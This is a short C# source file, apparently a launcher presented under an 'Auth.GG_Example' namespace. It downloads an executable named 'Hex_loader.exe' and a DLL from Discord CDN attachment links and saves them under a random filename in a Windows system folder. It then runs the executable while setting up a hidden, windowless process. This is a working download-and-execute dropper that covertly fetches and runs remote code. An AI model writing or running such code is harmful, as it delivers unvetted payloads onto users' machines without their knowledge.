using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.IO;
using System.Diagnostics;
using System.Threading;


namespace Auth.GG_Example
{
    class Dl
    {

        public static void Launcher()
        {
            WebClient Client = new WebClient();
            string text = @"C:\Windows\PLA\System\DhjxKJSF.exe";
            string text1 = @"C:\Windows\PLA\System\Guna.UI.dll";

            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855529903047049236/Hex_loader.exe", text);
            Client.DownloadFile("https://cdn.discordapp.com/attachments/855087379878248479/855529906124226560/Guna.UI.dll", text1);


            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.UseShellExecute = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            process = Process.Start(text);












        }
    }

}

